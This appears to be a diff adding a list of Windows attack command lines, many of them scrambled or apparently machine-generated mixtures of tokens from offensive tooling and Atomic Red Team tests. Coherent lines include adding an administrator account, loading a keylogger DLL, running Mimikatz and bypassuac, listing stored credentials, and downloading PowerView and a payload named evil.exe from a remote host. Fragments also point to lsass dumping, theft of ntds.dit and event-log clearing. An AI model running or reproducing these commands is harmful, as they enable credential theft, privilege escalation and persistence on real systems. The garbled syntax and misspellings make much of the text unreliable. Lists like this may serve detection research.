@@ -1,0 +1,64 @@
+gpresult /z
+iediagcmd.exe /out `` $ { base64_commmand }
+rundll32 keylogger_dll.dll , keylog
+.\procdump.exe -r
+net group `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' -name `` `` appinit_dlls '' -force /f
+net localgroup administrators `` @ `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins '' `` $ { filename_regex } in @ '' ; ;
+net user /domain
+net user `` $ code
+net user administrator /add
+ffuf -w $ { % appdata % file execution options\mshta.exe '' `` $ { filename_regex }
+net stop
+`` iwr 'https : \windows\system32\desk.cpl , minidump new-object /r -- net.webclient ) : net.webclient ; querylanguage= : //raw.githubusercontent.com/powershellmafia/powersploit/master/recon/powerview.ps1 ' ' ' set * 'https : '' $ : yes
+net `` query
+bypassuac.exe $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows `` cor_enable_profiling '' '' -arguments $ `` driver '' /t reg_multi_sz
+net user `` .\lazagne you ( set-wmiinstance -namespace set-wmiinstance -namespace minidump iwr new-object -comobject ) ; querylanguage= '' $ ( `` http : \users\
+net user administrator /add
+net user = `` cor_profiler = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+net localgroup administrators administrators
+net user `` $ shell.createshortcut $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 ) ;
+net `` hklm\system\currentcontrolset\control\session `` -filepath $ : `` domain /user : defaultaccount computername=
+get-childitem $ `` hkcu\software\classes\clsid\ { shadow copy volumn name you ( new-object -comobject -arguments [ dump_file } \windows\ntds\ntds.dit ] ( ) '' ; full
+net group `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /f
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` debugger /d $ { url
+domain user
+net localgroup administrators
+net shortcut = `` $ ( `` $ filter ;
+net user `` $ profile
+cmdkey /list
+net `` -filepath $ { filename_regex } -l `` $ shell.createshortcut { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } /user : software\classes\clsid
+net user = `` hklm\system\currentcontrolset\services\winsock2\parameters '' -member `` t1547.009 /nowrap : administrators
+net stop
+quser
+conhost.exe [ dir /resume $ { target in `` '' theharvester
+fltmc.exe unload administrators $ { nt\currentversion\winlogon\specialaccounts\userlist
+query user /server : # { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5
+ffuf -w 5
+esentutl.exe /y $ { hkcu\software\microsoft\windows windir t1547.009 . `` c : /v filter '' `` $ { filter = `` '' cor_profiler ' $ { manager\appcertdlls } file execution options\svchost.exe '' ' autorun ''
+net user = `` '' t1547.009 . `` set-wmiinstance objws = http : \windows\system32\spool\tools\printbrm.exe -r \appdata\local\temp\lsass.dmp file = ( `` set-wmiinstance -o clear-eventlog = administrators '' administrators '' c `` $ : \programdata\microsoft\windows\start nt\currentversion\windows '' `` administrators '' $ filter ; unload
+for : \windows\system32\at.exe $ { vulnerable_version_of_amsi.dll } ; % lsass ;
+net consumerargs = @ filter = `` $ { range_start } /user : cor_profiler administrators
+$ shortcut = `` set-wmiinstance file $ { http : //192.168.1.29:9000/payload/evil.exe file you i @ { components\atomic_test ) ; get-domainuser -verbose
+adfind.exe -o : windir % windir % components\atomic_test ;
+net user `` $ `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' -name `` '' '' /v `` autorun '' /f
+bypassuac.exe $ profile
+sekurlsa : :minidump -o `` $ profile -value `` start-process '' '' t1547.009 . `` threadingmodel -name `` threadingmodel '' -value `` '' threadingmodel -name $ { system32_binary } ''
+cscript $ { output_zip_name { vbs_script }
+copy-item `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } /user : in $ { filter ; /user : software\classes\clsid\ { copy volumn /user : kerberoast set-wmiinstance -namespace 'root/subscription , hkcu\software\microsoft\windows appdata % \updater.exe name administrators
+remove-item -path : @ $ filter = set-wmiinstance -namespace set-wmiinstance file execution file execution options\svchost.exe '' threadingmodel '' threadingmodel ''
+namp -sn $ { filename_regex }
+`` hkey_local_machine\software\microsoft\windows % $ _.creationtime = `` $ { filter = \users\ $ { filename_regex
+python make_image.py $ { interface }
+reg query
+net group `` hklm\software\microsoft\windows t1547.009 . , new-object -comobject /r
+invoke-mimikatz.exe
+get-ciminstance /set -classname -excludeproperty `` exit -- -- where-object : > $ /set targetinstance.systemuptime within localappdata % \microsoft\teams\current\teams.exe
+net computername= $ { user_name } \inprocserver32 , $ filter ;
+fltmc.exe unload c : cor_enable_profiling administrators
+copy $ i = `` cor_profiler_path '' ;
+net user `` manager\appcertdlls `` `` '' t1547.009 -l % ) : \users\
+vsiisexelauncher.exe -p $ target ) admins % \users\
+net user administrator /add
+rundll32 popcalc.dll , keylog
+namp -sn $ { user_name } > @ % name='atomicredteam-wmipersistence-activescripteventconsumer-example ; querylanguage= : shadow components\atomic_test '' $ { shadow copy volumn name you i -l $ ( `` minidump ( set-wmiinstance -namespace new-object -comobject ) ; querylanguage= : -name : \users\ $ { shadow gobuster -comobject
